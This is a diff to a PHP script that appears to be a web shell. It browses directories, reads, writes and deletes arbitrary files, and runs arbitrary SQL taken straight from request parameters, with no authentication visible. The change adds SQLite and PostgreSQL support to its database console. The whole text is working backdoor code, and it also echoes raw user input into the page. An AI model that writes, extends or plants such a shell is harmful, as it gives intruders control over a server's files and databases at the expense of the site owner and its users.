@@ -87,8 +87,10 @@ if(!empty($_GET['delete']))
 
 if(!empty($_POST['query']))
 {
-	$dsn = 'mysql:dbname='. $_POST['database'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
-	$dbh = new PDO($dsn, $_POST['user'], $_POST['password']);
+	if ($_POST['dbms'] == 'sqlite' && file_exists($_POST['db'])) $dsn = 'sqlite:' . $_POST['db'];
+	else $dsn = $_POST['dbms'] . ':dbname='. $_POST['db'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
+	
+	$dbh = new PDO($dsn, $_POST['user'], $_POST['pwd']);
 	$stmt = $dbh->query($_POST['query']);
 
 	echo '<table border="1"><tr>';
@@ -117,7 +119,7 @@ if ($dir)
 			$f = $dir.'/'.$x;
 			echo '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'"><c1>';
 			echo GetPerms(fileperms($f)) . ' </c1><c2>';
-			if (is_dir($f)) echo $x . "</c2><c1></c1><c4> [<a href='$f'>open</a>] [<a href='?dir=$f'>browse</a>]";
+			if (is_dir($f)) echo $x . "</c2><c1></c1><c4> [<a href='$f'>open URL</a>] [<a href='?dir=$f'>browse</a>]";
 
 			else echo $x . "</c2><c1> (". GetSize(filesize($f)) .") </c1><c4>
 							[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
@@ -165,7 +167,13 @@ Write <input type="text" name="write" placeholder="file" value="<?=$f; ?>"><br>
 <textarea name="content" cols="100" rows="10" placeholder="content"><?=$c; ?></textarea><input type="submit">
 </form><br>
 <form action="?dir=<?=$dir;?>" METHOD="POST">
-MySQL<br>
+SQLquery<br>
+<select name="dbms">
+	<option>mysql</option>
+	<option>sqlite</option>
+	<option>pgsql</option>
+</select><br>
+
 <input type="text" name="server" value="<?=(!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1'; ?>">
 <input type="text" name="port" value="<?=(!empty($_POST['port'])) ? $_POST['port'] : '3306'; ?>"><br>
 <input type="text" name="user" value="<?=(!empty($_POST['user'])) ? $_POST['user'] : 'root'; ?>">
